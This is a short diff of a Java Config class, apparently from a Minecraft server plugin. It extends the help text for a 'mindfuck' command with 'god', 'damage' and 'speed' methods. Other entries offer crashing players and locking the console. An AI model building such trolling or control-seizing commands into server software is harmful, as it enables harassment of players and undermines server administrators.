@@ -83,7 +83,7 @@ public class Config {
             new HelpItem("silktouch",   "(player)",                     "gives player silk touch hands (def: nickname)"),
             new HelpItem("instabreak",  "(player)",                     "let's player mine instantly (def: nickname)"),
             new HelpItem("crash",       "[player]",                     "crashes player's name (def: nickname)"),
-            new HelpItem("mindfuck",    "(thrower), (interact), (cripple), (flight), (inventory), (drop), (teleport), (mine), (place), (login) [player]"," fucks with player (def: method nickname)"),
+            new HelpItem("mindfuck",    "(thrower), (interact), (cripple), (flight), (inventory), (drop), (teleport), (mine), (place), (login), (god), (damage), (speed) [player]"," fucks with player (def: method nickname)"),
             new HelpItem("lock",        "(player), (all) or (console)", "locks the console or blocks player (def: nickname, all or console)"),
             new HelpItem("unlock",      "(player), (all) or (console)", "unlocks the console or unblocks player (def: nickname, all or console)"),
             new HelpItem("mute",        "(player) or (all)",            "mutes a player (def: nickname or all)"),
